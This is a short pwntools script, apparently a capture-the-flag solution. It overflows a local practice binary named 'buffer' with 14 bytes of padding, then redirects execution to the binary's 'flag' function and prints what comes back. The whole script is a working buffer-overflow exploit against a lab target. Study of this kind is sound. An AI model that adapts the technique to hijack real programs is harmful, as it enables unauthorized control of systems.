from pwn import *

# Creating elf object
elf = context.binary = ELF('./buffer',checksec=False)

# Starting process
pr = process('./buffer')

# Defining offset which is found in pwndbg
off = 14

# Creating payload
pay = flat( b'a' * off, elf.functions.flag)
write('pay', pay)

# Sending payload
pr.sendlineafter(b':', pay)

# Pritning flag
print(pr.recvall().decode())
